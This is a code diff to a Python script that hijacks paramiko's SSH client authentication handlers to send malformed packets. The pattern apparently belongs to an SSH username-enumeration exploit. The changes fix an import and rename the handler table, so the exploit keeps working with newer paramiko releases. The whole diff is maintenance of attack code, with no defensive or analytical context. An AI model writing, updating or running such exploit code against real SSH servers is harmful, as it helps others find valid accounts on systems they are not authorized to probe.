@@ -21,7 +21,7 @@ import argparse
 import json
 import logging
 import multiprocessing
-import connect
+import socket
 import sys
 import warnings
 
@@ -32,7 +32,7 @@ with warnings.catch_warnings():
     import paramiko
 
 # store function we will overwrite to malform the packet
-old_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
+old_parse_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
 
 
 # create custom exception
@@ -115,8 +115,8 @@ def exportList(results):
 
 
 # assign functions to respective handlers
-paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
-paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error
+paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
+paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error
 
 # get rid of paramiko logging
 logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())
